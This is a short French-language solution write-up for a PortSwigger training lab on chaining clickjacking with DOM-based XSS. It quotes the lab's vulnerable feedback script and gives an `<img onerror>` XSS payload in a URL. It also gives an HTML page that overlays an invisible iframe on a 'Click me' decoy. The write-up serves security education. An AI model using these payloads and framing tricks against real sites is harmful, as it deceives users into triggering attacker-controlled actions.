# Lab

https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss

## Solution

Il y a une DOM XSS dans la fonctionnalité de feedback.

```js
document.getElementById("feedbackForm").addEventListener("submit", function(e) {
    submitFeedback(this.getAttribute("method"), this.getAttribute("action"), this.getAttribute("enctype"), this.getAttribute("personal"), new FormData(this));
    e.preventDefault();
});

function submitFeedback(method, path, encoding, personal, data) {
    var XHR = new XMLHttpRequest();
    XHR.open(method, path);
    if (personal) {
        XHR.addEventListener("load", displayFeedbackMessage(data.get('name')));
    } else {
        XHR.addEventListener("load", displayFeedbackMessage());
    }
    if (encoding === "multipart/form-data") {
        XHR.send(data)
    } else {
        var params = new URLSearchParams(data);
        XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        XHR.send(params.toString())
    }
}

function displayFeedbackMessage(name) {
    return function() {
        var feedbackResult = document.getElementById("feedbackResult");
        if (this.status === 200) {
            feedbackResult.innerHTML = "Thank you for submitting feedback" + (name ? ", " + name : "") + "!";
            feedbackForm.reset();
        } else {
            feedbackResult.innerHTML =  "Failed to submit feedback: " + this.responseText
        }
    }
}
```

On peux injecter dans le DOM via la fonction `displayFeedbackMessage` en passant un nom dans le paramètre `name`.

`https://0a92006e04cbe1fc8283fcaa007a00d7.web-security-academy.net/feedback?name=%3Cimg+src=x+onerror=print()%3E&email=email@email.com&subject=lol&message=lol`

Le payload de name en clair : `<img src=x onerror=print()>`


```html
<style>
	iframe {
		position:relative;
		width:700px;
		height: 500px;
		opacity: 0.0001;
		z-index: 2;
	}
	div {
		position:absolute;
		top:418px;
		left:80px;
		z-index: 1;
	}
</style>
<div>Click me</div>
<iframe
src="https://0a92006e04cbe1fc8283fcaa007a00d7.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```